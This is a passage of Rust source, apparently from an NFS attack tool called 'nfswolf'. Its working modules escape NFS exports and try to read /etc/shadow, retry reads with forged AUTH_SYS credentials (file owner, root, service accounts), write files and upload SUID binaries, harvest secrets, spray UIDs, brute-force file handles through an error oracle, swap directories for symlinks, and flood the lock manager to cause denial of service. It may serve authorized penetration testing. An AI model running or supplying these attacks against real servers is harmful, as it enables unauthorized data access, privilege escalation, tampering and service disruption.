                try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
                return Ok(());
            },
            Ok(Nfs3Result::Ok(_)) => {
                // Non-directory inode -- within the export subtree, not a root.
                tracing::debug!(inode, "scan hit non-directory inode (within export subtree)");
            },
            Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES | nfsstat3::NFS3ERR_PERM, _))) => {
                // ACCES means handle is valid but permission denied -- likely root of escaped FS.
                print_escape_success(&candidate, "found via scan (ACCES -- root_squash active)", host);
                try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
                return Ok(());
            },
            Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_STALE, _))) => {
                // Right format, wrong inode/gen -- handle structure is valid.
                found_stale = true;
                tracing::debug!(inode, "STALE");
            },
            Ok(Nfs3Result::Err((stat, _))) => {
                tracing::debug!(inode, ?stat, "probe rejected");
            },
            Err(e) => {
                tracing::debug!(inode, err = %e, "RPC error during escape scan");
            },
        }
    }

    if found_stale {
        eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
    } else {
        eprintln!("{}", crate::output::status_err("Export escape not supported for this filesystem / handle format (BADHANDLE)"));
    }
    Ok(())
}

/// Run the `read` module: mount -> lookup -> read -> output.
///
/// On NFS3ERR_ACCES, auto-escalates to the file's owner uid/gid and common
/// service accounts.  The file handle is a bearer token (RFC 1094 S2.3.3) --
/// the same handle works with any credential that the server will accept.
async fn run_read(opts: &FileTargetOpts, path: &str, output: Option<&str>, globals: &GlobalOpts, stealth: &StealthConfig) -> anyhow::Result<()> {
    eprintln!("{}", format!("[*] Reading {path} from {}", target_label(opts)).yellow());

    let uid = opts.uid.unwrap_or(globals.uid);
    let gid = opts.gid.unwrap_or(globals.gid);
    let addr = parse_addr(&opts.host)?;
    let (_, _, client) = make_client_for_opts(addr, opts, uid, gid, stealth.clone());

    let root_fh = resolve_fh(opts).await?;
    let file_fh = lookup_path(&client, &root_fh, path).await?;

    read_with_escalation(&client, &file_fh, output).await
}

/// Return true when an anyhow error wraps NFS3ERR_ACCES or NFS3ERR_PERM.
fn is_acces_error(e: &anyhow::Error) -> bool {
    let msg = e.to_string();
    msg.contains("NFS3ERR_ACCES") || msg.contains("NFS3ERR_PERM")
}

/// Attempt to read `fh`, retrying with escalated credentials on ACCES.
///
/// Strategy (matches lookup_path escalation so read and traverse use the same ladder):
///   1. Current credential.
///   2. File's owner (uid, gid) from GETATTR -- the most targeted escalation.
///   3. root (0, 0) -- succeeds if the export has no_root_squash.
///   4. Common service UIDs (nobody, 1000, www-data, mysql, postgres).
///
/// If all fail, the error includes the suggestion to use --aux-gids for GID-based
/// access (e.g., shadow group gid=42 on Debian, gid=0 for root-readable files).
async fn read_with_escalation(client: &Nfs3Client, fh: &FileHandle, output: Option<&str>) -> anyhow::Result<()> {
    // Fast path: current credential works.
    match read_and_output(client, fh, output).await {
        Ok(()) => return Ok(()),
        Err(e) if !is_acces_error(&e) => return Err(e),
        Err(_) => {}, // ACCES/PERM -> try escalation
    }

    // Get the file's owner uid/gid for targeted escalation.
    let owner = get_owner_uid(client, fh).await;
    if let Some((o_uid, o_gid)) = owner {
        tracing::debug!(o_uid, o_gid, "file owner for READ escalation");
    }
    let escalation = build_escalation_uids((client.uid(), client.gid()), owner);

    for (try_uid, try_gid) in &escalation {
        tracing::debug!(try_uid, try_gid, "retrying READ with escalated credential");
        let cred = Credential::Sys(AuthSys::with_groups(*try_uid, *try_gid, &[*try_gid], "nfswolf"));
        let esc = client.with_credential(cred, *try_uid, *try_gid);
        match read_and_output(&esc, fh, output).await {
            Ok(()) => {
                eprintln!("{}", crate::output::status_ok(&format!("Read succeeded with uid={try_uid} gid={try_gid}")));
                return Ok(());
            },
            Err(e) if !is_acces_error(&e) => return Err(e), // non-ACCES error; don't mask it
            Err(_) => {},                                   // ACCES -- try next credential
        }
    }

    anyhow::bail!(
        "NFS3ERR_ACCES: permission denied (tried {} credentials).\n\
         Hint: if the file requires a supplementary group (e.g. shadow gid=42), add --aux-gids <GID>.",
        escalation.len()
    )
}

/// Read a file handle completely, buffering all data before writing to output.
///
/// Buffers before writing so that a failed retry (e.g. in read_with_escalation)
/// does not emit partial data to stdout.
async fn read_and_output(client: &Nfs3Client, fh: &FileHandle, output: Option<&str>) -> anyhow::Result<()> {
    use nfs3_types::nfs3::{Nfs3Result, READ3args};

    const CHUNK: u32 = 65536;
    let mut offset: u64 = 0;
    let mut buf: Vec<u8> = Vec::new();

    loop {
        let args = READ3args { file: fh.to_nfs_fh3(), offset, count: CHUNK };
        let res = client.read(&args).await?;
        match res {
            Nfs3Result::Ok(ok) => {
                let data = ok.data.as_ref();
                let eof = ok.eof;
                buf.extend_from_slice(data);
                offset += data.len() as u64;
                if eof || data.is_empty() {
                    break;
                }
            },
            Nfs3Result::Err((stat, _)) => {
                anyhow::bail!("READ: {stat:?}");
            },
        }
    }

    match output {
        Some(path) => {
            std::fs::write(path, &buf)?;
            eprintln!("{}", format!("[+] Written {} bytes to {path}", buf.len()).green());
        },
        None => {
            std::io::stdout().write_all(&buf)?;
        },
    }

    Ok(())
}

/// Run the `write` module.
async fn run_write(opts: &FileTargetOpts, path: &str, data: Option<&str>, file: Option<&str>, append: bool, globals: &GlobalOpts, stealth: &StealthConfig) -> anyhow::Result<()> {
    let op = if append { "Appending to" } else { "Writing" };
    eprintln!("{}", format!("[*] {op} {path} on {}", target_label(opts)).yellow());

    let content = if let Some(d) = data {
        d.as_bytes().to_vec()
    } else if let Some(f) = file {
        std::fs::read(f).with_context(|| format!("read local file {f}"))?
    } else {
        anyhow::bail!("--data or --file is required");
    };

    let uid = opts.uid.unwrap_or(globals.uid);
    let gid = opts.gid.unwrap_or(globals.gid);
    let addr = parse_addr(&opts.host)?;
    let (_, _, client) = make_client_for_opts(addr, opts, uid, gid, stealth.clone());
    let root_fh = resolve_fh(opts).await?;
    let file_fh = lookup_or_create(&client, &root_fh, path).await?;

    write_data(&client, &file_fh, &content, append).await
}

/// Write bytes to an NFS file handle.
async fn write_data(client: &Nfs3Client, fh: &FileHandle, data: &[u8], append: bool) -> anyhow::Result<()> {
    use nfs3_types::nfs3::{Nfs3Result, WRITE3args, stable_how};
    use nfs3_types::xdr_codec::Opaque;
    const CHUNK: usize = 65536;

    // If appending, GETATTR to find current file size.
    let base_offset = if append {
        use nfs3_types::nfs3::{GETATTR3args, Nfs3Result as R};
        let args = GETATTR3args { object: fh.to_nfs_fh3() };
        let res = client.getattr(&args).await?;
        match res {
            R::Ok(ok) => ok.obj_attributes.size,
            R::Err((stat, _)) => anyhow::bail!("GETATTR for append: {stat:?}"),
        }
    } else {
        0u64
    };

    let mut written = 0usize;

    for chunk in data.chunks(CHUNK) {
        let chunk_len = u32::try_from(chunk.len()).unwrap_or(u32::MAX);
        let args = WRITE3args { file: fh.to_nfs_fh3(), offset: base_offset + written as u64, count: chunk_len, stable: stable_how::FILE_SYNC, data: Opaque::borrowed(chunk) };
        let res = client.write(&args).await?;
        match res {
            Nfs3Result::Ok(ok) => {
                written += ok.count as usize;
            },
            Nfs3Result::Err((stat, _)) => {
                anyhow::bail!("WRITE: {stat:?}");
            },
        }
    }

    eprintln!("{}", format!("[+] Wrote {written} bytes").green());
    Ok(())
}

/// Run the `upload` module.
async fn run_upload(opts: &FileTargetOpts, local_file: &str, path: &str, suid: bool, globals: &GlobalOpts, stealth: &StealthConfig) -> anyhow::Result<()> {
    let flags = if suid { " [SUID]" } else { "" };
    eprintln!("{}", format!("[*] Uploading {local_file}{flags} to {}:{path}", target_label(opts)).yellow());

    let content = std::fs::read(local_file).with_context(|| format!("read {local_file}"))?;
    let uid = opts.uid.unwrap_or(globals.uid);
    let gid = opts.gid.unwrap_or(globals.gid);
    let addr = parse_addr(&opts.host)?;
    let (_, _, client) = make_client_for_opts(addr, opts, uid, gid, stealth.clone());
    let root_fh = resolve_fh(opts).await?;
    let file_fh = lookup_or_create(&client, &root_fh, path).await?;

    write_data(&client, &file_fh, &content, false).await
}

/// Run the `harvest` module: walk filesystem, collect interesting files.
async fn run_harvest(opts: &FileTargetOpts, output: &str, depth: u32, extra_patterns: &[String], hash: bool, globals: &GlobalOpts, stealth: &StealthConfig) -> anyhow::Result<()> {
    eprintln!("{}", format!("[*] Harvesting from {}", target_label(opts)).yellow());

    let uid = opts.uid.unwrap_or(globals.uid);
    let gid = opts.gid.unwrap_or(globals.gid);
    let addr = parse_addr(&opts.host)?;
    let (_, _, client) = make_client_for_opts(addr, opts, uid, gid, stealth.clone());
    let root_fh = resolve_fh(opts).await?;

    let credential_mgr = CredentialManager::new(uid, gid, &globals.hostname);
    let walker = FsWalker::new(client, credential_mgr, stealth.clone());

    let mut patterns = SecretPatterns::default();
    if !extra_patterns.is_empty() {
        patterns.add_custom(extra_patterns.to_vec());
    }

    let config = WalkConfig { max_depth: depth, patterns, compute_hashes: hash, detect_suid: true, detect_world_writable: true };

    let result = walker.walk(&root_fh, &config).await?;

    eprintln!("{}", format!("[+] Walk complete: {} files, {} dirs", result.total_files, result.total_dirs).green());
    eprintln!("    Interesting: {}", result.interesting_files.len());
    eprintln!("    SUID: {}", result.suid_binaries.len());
    eprintln!("    World-writable: {}", result.world_writable.len());

    // Create output directory and write findings.
    std::fs::create_dir_all(output)?;
    let findings_path = format!("{output}/findings.txt");
    let mut findings = String::new();
    for f in &result.interesting_files {
        let _ = writeln!(findings, "[{}] {} (uid={} gid={} mode={:04o})", f.category, f.path, f.uid, f.gid, f.mode);
    }
    std::fs::write(&findings_path, findings)?;
    eprintln!("[*] Findings written to {findings_path}");

    Ok(())
}

/// Run the `uid-spray` module.
#[expect(clippy::too_many_arguments, reason = "CLI dispatch  --  each arg maps to a clap field")]
async fn run_uid_spray(host: &str, export: &str, uid_range: std::ops::RangeInclusive<u32>, gid_range: std::ops::RangeInclusive<u32>, path: &str, aux_gids: &[u32], attempt_delay: u64, stealth: &StealthConfig) -> anyhow::Result<()> {
    eprintln!("{}", format!("[*] Spraying UIDs {}-{} on {host}:{export}", uid_range.start(), uid_range.end()).yellow());

    let addr = parse_addr(host)?;
    let (_, circuit, client) = make_client(addr, export, 0, 0, &[], stealth.clone());

    // Mount to get the root handle, then lookup the target path.
    let mount = NfsMountClient::new();
    let mnt = mount.mount(addr, export).await?;
    let target_fh = if path == "/" {
        mnt.handle
    } else {
        let (_, _, lookup_client) = make_client(addr, export, 0, 0, &[], stealth.clone());
        lookup_path(&lookup_client, &mnt.handle, path).await?
    };

    let sprayer = UidSprayer::new(client, circuit, stealth.clone());
    let config = SprayConfig { uid_range, gid_range, auxiliary_gids: aux_gids.to_vec(), target_path: path.to_owned(), concurrency: 1, required_access: access_bits::ALL, per_attempt_delay_ms: attempt_delay };

    let results = sprayer.spray(&config, &target_fh).await;
    eprintln!("{}", format!("[+] {} credential(s) granted access", results.len()).green());
    for r in &results {
        let flags = access_summary(r.access);
        eprintln!("    uid={} gid={} [{flags}]", r.uid, r.gid);
    }

    Ok(())
}

/// Produce a compact access summary string from an access bitmask.
fn access_summary(access: u32) -> String {
    let mut flags = Vec::with_capacity(6);
    if access & access_bits::READ != 0 {
        flags.push("READ");
    }
    if access & access_bits::LOOKUP != 0 {
        flags.push("LOOKUP");
    }
    if access & access_bits::MODIFY != 0 {
        flags.push("MODIFY");
    }
    if access & access_bits::EXTEND != 0 {
        flags.push("EXTEND");
    }
    if access & access_bits::DELETE != 0 {
        flags.push("DELETE");
    }
    if access & access_bits::EXECUTE != 0 {
        flags.push("EXECUTE");
    }
    flags.join("|")
}

/// Run the `brute-handle` module.
///
/// Generates candidate file handles based on the filesystem type and tests
/// each with GETATTR. The NFS error oracle (STALE vs BADHANDLE) tells us
/// whether the handle format is correct (F-2.2, RFC 1813 S2.6).
async fn run_brute_handle(host: &str, fs_type: &str, seed_handle: &str, max_attempts: u64, fixed_inode: Option<u32>, gen_start: u32, gen_end: u32, stealth: &StealthConfig) -> anyhow::Result<()> {
    let mode = if let Some(inode) = fixed_inode { format!("inode={inode} gen-sweep") } else { format!("inode-sweep {fs_type}") };
    eprintln!("{}", crate::output::status_info(&format!("Brute-forcing handles on {host} [{mode}] (max {max_attempts})")));

    let seed = FileHandle::from_hex(seed_handle).context("invalid --seed-handle")?;
    let addr = parse_addr(host)?;

    let mount = NfsMountClient::new();
    let exports = mount.list_exports(addr).await.unwrap_or_default();
    let export_path = exports.first().map_or("/", |e| e.path.as_str()).to_owned();
    let (_, _, client) = make_client(addr, &export_path, 0, 0, &[], stealth.clone());

    let mut hits = 0u64;
    let mut stale = 0u64;
    let mut tried = 0u64;

    if let Some(inode) = fixed_inode {
        // --- Generation sweep for a fixed inode ---
        // Use when the STALE oracle confirmed the handle format is correct but the
        // generation is unknown. Ext4 root inodes typically have gen=0 (mkfs default),
        // but modern e2fsprogs may use a random value. XFS/ext4 inodes get random
        // generations after delete+recreate cycles. Cap: gen_end or max_attempts.
        let end_gen = if gen_end > gen_start { gen_end } else { u32::try_from(u64::from(gen_start).saturating_add(max_attempts).min(u64::from(u32::MAX))).unwrap_or(u32::MAX) };
        eprintln!("{}", crate::output::status_info(&format!("Sweeping gen {gen_start}..={end_gen} for inode {inode}")));

        let mut cur_gen = gen_start;
        while cur_gen <= end_gen && tried < max_attempts {
            if let Some(result) = FileHandleAnalyzer::construct_handle_for_inode(&seed, inode, cur_gen) {
                tried += 1;
                probe_handle(&client, &result.root_handle, tried, &mut hits, &mut stale).await;
                if hits > 0 {
                    eprintln!("{}", crate::output::status_ok(&format!("Root handle found! inode={inode} gen={cur_gen} -- use this handle with 'shell --handle'")));
                    break;
                }
            }
            cur_gen = cur_gen.saturating_add(1);
        }
    } else if fs_type == "btrfs" {
        // BTRFS: iterate subvolume IDs (256+).
        let max = u32::try_from(max_attempts.min(u64::from(u32::MAX))).unwrap_or(u32::MAX);
        let candidates = FileHandleAnalyzer::construct_btrfs_subvol_handles(&seed, max);
        for candidate in candidates {
            if tried >= max_attempts {
                break;
            }
            tried += 1;
            probe_handle(&client, &candidate.root_handle, tried, &mut hits, &mut stale).await;
        }
    } else {
        // Inode sweep: try inodes 2..max starting with gen=0 (root), then gen=1.
        // ext4 root is always inode 2. XFS root is 128 (v5) or 64 (v4).
        // If all inodes return STALE, use --fixed-inode 2 --gen-start 0 to sweep gens.
        let start_inode = match fs_type {
            "xfs" => 64u64,
            _ => 2u64,
        };
        for inode in start_inode..start_inode + max_attempts {
            if tried >= max_attempts {
                break;
            }
            let inode32 = u32::try_from(inode).unwrap_or(u32::MAX);
            if let Some(result) = FileHandleAnalyzer::construct_handle_for_inode(&seed, inode32, 0) {
                tried += 1;
                probe_handle(&client, &result.root_handle, tried, &mut hits, &mut stale).await;
                if hits > 0 {
                    break;
                }
            }
        }
    }

    eprintln!("[*] Tried {tried} handles, {hits} hits, {stale} stale (format match)");
    if hits == 0 && stale > 0 {
        eprintln!(
            "{}",
            crate::output::status_warn(
                "All candidates returned STALE (format recognized but wrong inode/gen). \
             Try: --fixed-inode 2 --gen-start 0 (ext4 root gen sweep)"
            )
        );
    }
    Ok(())
}

/// Test a single candidate handle with GETATTR and update counters.
///
/// STALE (70) = correct format, wrong inode/generation -- the oracle confirms
/// the handle structure is valid (F-2.2). BADHANDLE (10001) = wrong format.
async fn probe_handle(client: &Nfs3Client, fh: &FileHandle, attempt: u64, hits: &mut u64, stale: &mut u64) {
    use nfs3_types::nfs3::{GETATTR3args, nfsstat3};
    let args = GETATTR3args { object: fh.to_nfs_fh3() };
    match client.getattr(&args).await {
        Ok(res) => match res {
            Nfs3Result::Ok(_) => {
                *hits += 1;
                eprintln!("{}", format!("[+] Handle HIT (inode exists): {}", fh.to_hex()).green());
            },
            Nfs3Result::Err((nfsstat3::NFS3ERR_STALE, _)) => {
                *stale += 1;
                // STALE = right format, wrong inode/gen -- the handle structure is valid.
                tracing::debug!(attempt, "STALE (format match, wrong inode/gen)");
            },
            Nfs3Result::Err((stat, _)) => {
                tracing::debug!(?stat, attempt, "brute handle probe rejected");
            },
        },
        Err(e) => {
            tracing::debug!(err = %e, "brute handle RPC error");
        },
    }
}

/// Run the `symlink-swap` module.
///
/// Mounts the parent export, removes the named child, and creates a symlink
/// pointing to `link_target` on the server filesystem. Requires write access
/// to the parent export. Tasklist S5.4 item 8.
async fn run_symlink_swap(host: &str, parent_export: &str, child_name: &str, link_target: &str, stealth: &StealthConfig) -> anyhow::Result<()> {
    use nfs3_types::nfs3::{REMOVE3args, SYMLINK3args, diropargs3, filename3, nfspath3, sattr3, symlinkdata3};
    use nfs3_types::xdr_codec::Opaque;

    eprintln!("{}", format!("[*] Replacing {parent_export}/{child_name} -> symlink to {link_target} on {host}").yellow());
    eprintln!("{}", "[!] This operation is destructive  --  the child directory will be removed.".red());

    let addr = parse_addr(host)?;
    let (_, _, client) = make_client(addr, parent_export, 0, 0, &[], stealth.clone());

    // Mount export to get the parent directory handle.
    let mount = NfsMountClient::new();
    let mnt = mount.mount(addr, parent_export).await?;
    let parent_fh = mnt.handle;

    // Remove the child first. Try REMOVE (file); if ISDIR, fall back to RMDIR.
    let remove_args = REMOVE3args { object: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3::from(child_name.as_bytes()) } };
    match client.remove(&remove_args).await? {
        Nfs3Result::Ok(_) => eprintln!("{}", format!("[+] Removed {child_name}").green()),
        Nfs3Result::Err((nfs3_types::nfs3::nfsstat3::NFS3ERR_ISDIR, _)) => {
            // Target is a directory -- use RMDIR instead.
            let rmdir_args = nfs3_types::nfs3::RMDIR3args { object: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3::from(child_name.as_bytes()) } };
            match client.rmdir(&rmdir_args).await? {
                Nfs3Result::Ok(_) => eprintln!("{}", format!("[+] Removed directory {child_name}").green()),
                Nfs3Result::Err((stat, _)) => anyhow::bail!("RMDIR {child_name}: {stat:?}"),
            }
        },
        Nfs3Result::Err((stat, _)) => anyhow::bail!("REMOVE {child_name}: {stat:?}"),
    }

    // SYMLINK: create the replacement symlink pointing to link_target.
    let symlink_args = SYMLINK3args { where_: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3::from(child_name.as_bytes()) }, symlink: symlinkdata3 { symlink_attributes: sattr3::default(), symlink_data: nfspath3(Opaque::owned(link_target.as_bytes().to_vec())) } };
    match client.symlink(&symlink_args).await? {
        Nfs3Result::Ok(ok) => {
            // Nfs3Option<nfs_fh3> has no .as_ref()  --  match directly.
            let handle_hex = match ok.obj {
                nfs3_types::nfs3::Nfs3Option::Some(ref fh) => FileHandle::from_nfs_fh3(fh).to_hex(),
                nfs3_types::nfs3::Nfs3Option::None => "(no handle)".to_owned(),
            };
            eprintln!("{}", format!("[+] Symlink created: {child_name} -> {link_target}  handle={handle_hex}").green());
        },
        Nfs3Result::Err((stat, _)) => anyhow::bail!("SYMLINK {child_name}: {stat:?}"),
    }

    Ok(())
}

/// Run the `lock-dos` module.
///
/// Connects to the NLM daemon (program 100021), acquires up to `count` exclusive
/// locks on each target file using successive 1-byte ranges.  Reports how many locks
/// succeed before the server rejects with NLM4_DENIED_NOLOCKS, which directly
/// measures the server's lock table capacity (F-6.1 severity).
///
/// `count > 1` sweeps through ranges [0..1], [1..2], etc.  `count=1` locks the
/// entire file (offset=0, length=0).
async fn run_lock_dos(host: &str, export: &str, files: &[String], count: u32, hold_forever: bool, hold_secs: u64) -> anyhow::Result<()> {
    use crate::proto::auth::{AuthSys, Credential};
    use crate::proto::conn::ReconnectStrategy;
    use crate::proto::nlm::client::NlmClient;

    if files.is_empty() {
        anyhow::bail!("--files is required (comma-separated list of paths to lock)");
    }

    let hold = if hold_forever { "indefinitely".to_owned() } else { format!("{hold_secs}s") };
    eprintln!("{}", format!("[*] Acquiring up to {count} NLM lock(s) per file on {} file(s) in {host}:{export} for {hold}", files.len()).yellow());

    let addr = parse_addr(host)?;

    // Build a raw NfsConnection for NLM  --  NLM runs on the NFS port (2049).
    // NfsConnection::connect also mounts; that side-effect is harmless here.
    let auth = AuthSys::with_groups(0, 0, &[], "nfswolf");
    let cred = Credential::Sys(auth);
    let nlm_conn = crate::proto::conn::NfsConnection::connect(addr, export, cred, ReconnectStrategy::Persistent, None).await?;
    let mut nlm = NlmClient::new(nlm_conn);

    // Mount export to get root handle for path lookups.
    let mount = NfsMountClient::new();
    let mnt = mount.mount(addr, export).await?;
    let (_, _, nfs_client) = make_client(addr, export, 0, 0, &[], StealthConfig::none());

    // Locked entries: (display_path, fh, offset, length)
    let mut locked: Vec<(String, FileHandle, u64, u64)> = Vec::new();
    let mut server_limit_hit = false;

    for path in files {
        let fh = match lookup_path(&nfs_client, &mnt.handle, path).await {
            Ok(fh) => fh,
            Err(e) => {
                eprintln!("{}", format!("[-] LOOKUP {path}: {e}").red());
                continue;
            },
        };

        if count == 1 {
            // Single lock: lock the entire file (offset=0, length=0).
            match nlm.lock(&fh, 0, 0, true).await {
                Ok(status) if status.is_granted() => {
                    eprintln!("{}", format!("[+] Locked: {path}").green());
                    locked.push((path.clone(), fh, 0, 0));
                },
                Ok(status) => {
                    // NLM4_DENIED_NOLOCKS (4) = lock table full.
                    if status.stat == 4 {
                        eprintln!("{}", format!("[-] Server lock table full for {path}: NLM4_DENIED_NOLOCKS").red());
                        server_limit_hit = true;
                    } else {
                        eprintln!("{}", format!("[-] Lock denied for {path}: stat={}", status.stat).red());
                    }
                },
                Err(e) => eprintln!("{}", format!("[-] NLM error for {path}: {e}").red()),
            }
        } else {
            // Multi-lock flood: acquire N locks on successive 1-byte ranges.
            let mut acquired = 0u32;
            for i in 0..count {
                let offset = u64::from(i);
                match nlm.lock(&fh, offset, 1, true).await {
                    Ok(status) if status.is_granted() => {
                        acquired += 1;
                        locked.push((format!("{path}@{offset}"), fh.clone(), offset, 1));
                    },
                    Ok(status) => {
                        if status.stat == 4 {
                            // NLM4_DENIED_NOLOCKS: server lock table is full.
                            eprintln!("{}", format!("[!] Server lock table exhausted after {acquired} locks (NLM4_DENIED_NOLOCKS)  --  F-6.1 confirmed").yellow());
                            server_limit_hit = true;
                            break;
                        }
                        eprintln!("{}", format!("[-] Lock {i} denied for {path}: stat={}", status.stat).red());
                        break;
                    },
                    Err(e) => {
                        eprintln!("{}", format!("[-] NLM error at lock {i} for {path}: {e}").red());
                        break;
                    },
                }
            }
            if acquired > 0 {
                eprintln!("{}", format!("[+] Acquired {acquired}/{count} locks on {path}").green());
            }
        }
    }

    if locked.is_empty() {
        eprintln!("{}", "[-] No locks acquired.".red());
        return Ok(());
    }

    if server_limit_hit {
        eprintln!("{}", format!("[!] Server lock table limit confirmed: {} locks before rejection", locked.len()).yellow());
    } else {
        eprintln!("{}", format!("[*] Holding {} lock(s). Press Ctrl-C to release.", locked.len()).yellow());
    }

    if hold_forever {
        // Sleep until interrupted. tokio::signal would be better, but
        // a long sleep is simpler and the user can Ctrl-C.
        loop {
            tokio::time::sleep(std::time::Duration::from_secs(3600)).await;
        }
    } else {
        tokio::time::sleep(std::time::Duration::from_secs(hold_secs)).await;
    }

    // Release all locks.
    for (label, fh, offset, length) in &locked {
        if let Err(e) = nlm.unlock(fh, *offset, *length).await {
            eprintln!("{}", format!("[-] Unlock error for {label}: {e}").red());
        } else {
            eprintln!("{}", format!("[*] Released: {label}").yellow());
        }
    }

    Ok(())
}
